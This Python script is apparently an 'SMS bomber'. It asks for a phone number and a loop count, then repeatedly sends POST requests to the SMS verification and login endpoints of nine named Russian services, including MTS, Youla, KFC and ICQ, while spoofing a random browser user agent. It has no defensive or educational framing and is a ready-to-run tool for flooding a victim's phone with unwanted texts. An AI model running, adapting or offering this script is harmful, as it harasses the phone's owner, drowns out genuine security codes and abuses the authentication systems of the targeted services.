import fake_useragent
import requests

user = fake_useragent.UserAgent().random
headers ={'user_agent' : user}
num = input("Введите номер теолефона: (Без +) ")
n = int(input("Введите кол-во циклов: "))

#79000203372
#7 (900) 020-33-73:
#login: 900 020-33-75
#+7 9000203374

#_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

num_cash = num[0]+' ''('+num[1:4]+')'' '+num[4:7]+'-'+num[7:9]+'-'+num[9:11]
num_mts = num[1:4]+' '+num[4:7]+'-'+num[7:9]+'-'+num[9:11]
num_9 = num[1:]
num_kfc = '+'+num[0]+' '+num[1:]

i = 1
while i <= n:
    try:
        response = requests.post('https://shop.vsk.ru/ajax/auth/postSms/', headers=headers, data={'phone' : num})
        print("Вск Отправлено")
    except:
        print("Вск Не отправлено")

    try:
        response = requests.post('https://cash-u.com/main/rest/validate/phone', headers=headers, data={'' : num_cash})
        print("cash-u Отправлено")
    except:
        print("cash-u Не отправлено")

    try:
        response = requests.post('https://youla.ru/web-api/auth/request_code', headers=headers, data={'phone' : num})
        print("youla Отправлено")
    except:
        print("youla Не отправлено")

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + num + '/')
        print("citilink Отправлено")
    except:
        print("citilink Не отправлено")

    try:
        response = requests.post('https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https%3A%2F%2Fchel.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin', headers=headers, data={'login' : num_mts})
        print("mts Отправлено")
    except:
        print("mts Не отправлено")

    try:
        response = requests.post('https://lenta.com/api/v1/registration/requestUserStatus', headers=headers, data={'phoneNumber' : num})
        print("lenta Отправлено")
    except:
        print("lenta Не отправлено")

    try:
        response = requests.post('https://my.modulbank.ru/api/v2/auth/phone', headers=headers, data={'CellPhone' : num_9})
        print("modulbank Отправлено")
    except:
        print("modulbank Не отправлено")

    try:
        response = requests.post('https://u.icq.net/api/v51/rapi/auth/sendCode', headers=headers, params={'phone' : num, 'language': "ru-RU", 'route': "sms", 'devId': "ic1rtwy1s2Hi1O0r", 'application': "icq"})
        print("icq Отправлено")
    except:
        print("icq Не отправлено")

    try:
        response = requests.post('https://www.kfc.ru/api/account/verify', headers=headers, data={'phone' : num_kfc})
        print("kfc Отправлено")
    except:
        print("kfc Не отправлено")
    i+=1


